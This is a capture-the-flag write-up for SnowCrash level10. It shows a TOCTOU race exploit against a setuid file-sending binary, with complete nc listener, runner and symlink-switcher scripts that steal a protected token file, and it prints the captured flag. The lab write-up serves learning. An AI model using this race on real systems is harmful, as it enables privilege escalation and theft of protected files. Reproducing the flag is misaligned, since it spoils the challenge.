### Firsts observations

This is the same config as before.

-> level10 executable with setuid set.

If we ltrace the file we see that it expected 2 arguments 

```bash
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```
If we create a file in /var/crash/test 

We can launch the program :

```bash
level10@SnowCrash:~$ ./level10 /var/crash/test 127.0.0.1
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
```

So let's try with nc in order to be an accessible host
-> We can establish a TCP listener to accept and treat comment via a port with `nc -l 6969 > /tmp/received.txt`

With another terminal we get :
```bash
level10@SnowCrash:~$ ./level10 /var/crash/received.txt 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
```
---

### TOCTOU attack (Time Of Check To Time Of Use)


```bash
if (access("/tmp/file", R_OK) == 0) {  // Check : puis-je lire ?
    fd = open("/tmp/file", O_RDONLY);   // Use : j’ouvre le fichier
    read(fd, buffer, 100);
}
```
This idea is to create a symbolic link inbetween the check of the file, and the opening of this file to change his content.

### Processus

> First create the 2 fake file in /var/crash

```bash
level10@SnowCrash:~$ touch /var/crash/fake /var/crash/fake_ptr
```

> Second, create the scripts listener.sh runner.sh switcher.sh in the same directory

```bash
level10@SnowCrash:~$ touch /var/crash/listener.sh /var/crash/runner.sh /var/crash/switcher.sh
```
listener.sh
```bash
while true; do
    nc -l 6969
done
```
runner.sh
```bash
while true; do
    /home/user/level10/level10 /var/crash/fake 127.0.0.1
done
```

switcher.sh
```bash
while true; do
    ln -sf /var/crash/fake_ptr /var/crash/fake    # point to a file you own
    ln -sf /home/user/level10/token /var/crash/fake  # point to real token
done

Open 3 VM windows to see the result !

In one you launch switcher
Another listener
Another runner

![Capture d'écran — écran de connexion](/home/melmarti/snow_crash/level10/Screenshot from 2025-10-29 16-33-10.png)

---

```bash
level10@SnowCrash:/var/crash$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```